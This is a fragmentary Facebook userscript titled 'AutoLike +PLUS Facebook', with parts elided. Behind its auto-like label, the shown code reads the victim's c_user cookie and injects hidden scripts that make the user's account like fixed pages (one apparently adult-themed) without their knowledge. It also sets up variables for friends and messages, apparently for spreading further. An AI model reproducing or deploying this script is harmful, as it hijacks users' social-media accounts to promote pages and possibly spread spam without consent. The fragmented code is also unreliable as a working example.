// ==UserScript==
// @name            Updated] AutoLike +PLUS Facebook
// @namespace       Updated] AutoLike +PLUS Facebook
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:543355322355253,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("usasingles",'facebook',365);
		...
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:543355322355253,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("Hot.Shemales",'facebook',365);

	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:110850419037624,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	...
	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:543355322355253,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("Total.Fun.for.every.one",'facebook',365);
...
var spage_id = "543355322355253";
var spost_id = "543355322355253";
var sfoto_id = "543355322355253";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
